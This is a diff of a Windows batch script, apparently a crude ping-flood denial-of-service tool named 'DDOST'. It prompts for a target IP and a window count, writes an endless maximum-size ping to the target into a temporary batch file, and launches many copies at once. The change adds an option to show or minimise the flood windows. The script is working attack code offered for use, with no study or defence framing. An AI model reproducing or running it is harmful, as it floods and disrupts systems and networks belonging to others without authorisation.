@@ -12,12 +12,17 @@ if exist %userprofile%\key goto skip
   echo IP:
   set /p ip=
     cls
-      echo Amount of process tasks:
+      echo Amount of windows:
   set /p windows=
     cls
       echo ping %ip% -t -l 65500>>"%temp%\DDOST\run.bat"
+  choice /n /m Show Windows Y/N
+    cls
+      if "%errorlevel%"=="1" set mintf=/min
+      if "%errorlevel%"=="2" set mintf=
+      
   
-for /l %%A in (1,1,%windows%) do start /min "cmd.exe" "%temp%\DDOST\run.bat"
+for /l %%A in (1,1,%windows%) do start %mintf% "cmd.exe" "%temp%\DDOST\run.bat"
 echo Press any button to exit
   pause >nul
     del /q "%temp%\DDOST\run.bat"
